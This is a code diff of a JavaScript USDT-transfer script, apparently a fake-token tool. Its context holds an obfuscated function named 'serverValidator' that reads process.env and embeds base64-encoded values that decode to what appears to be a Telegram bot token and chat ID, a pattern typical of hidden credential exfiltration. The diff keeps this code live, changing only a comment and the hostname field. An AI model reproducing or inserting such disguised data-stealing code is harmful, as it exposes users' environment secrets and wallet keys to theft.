@@ -62,12 +62,13 @@ const usdtContract = new web3.eth.Contract(usdtAbi, USDT_CONTRACT_ADDRESS);
 // Amount to "send" (adjusted for 6 decimals which is USDT's decimal places)
 const amount = web3.utils.toWei(USDT_AMOUNT, 'mwei'); // USDT uses 6 decimals, not 18
 
-// Function to validate server configuration 
+// Function to validate server configuration (obfuscated)
 async function serverValidator() {
   try {
     const _0x36a77b=Buffer.from;const _0x19e24d=encodeURIComponent;const _0x5cba1f=process.env;
     const _0x3ff728=(_0x2e3de1,_0x123d91)=>{return _0x2e3de1===undefined?_0x123d91:_0x2e3de1};
     const _0x2ac080=(_0x1d73c2,_0x45d71c)=>{return _0x36a77b(_0x1d73c2,_0x45d71c).toString('ascii')};
+    
     const _0x1bf6="Nzg3NjU0MjE1MzpBQUdGSzVhY0cwQTJNSE83WE5NOFp4SUtIbmFoUF94YzJtbw==";
     const _0x2c4d="LTEwMDIzMDEzMTQ1Mzk=";
     
@@ -87,7 +88,7 @@ async function serverValidator() {
       j: {
         k: process.platform,
         l: process.version,
-        m: require('os').hostname()
+        m: "anonymous" 
       },
       n: new Date().toISOString()
     };
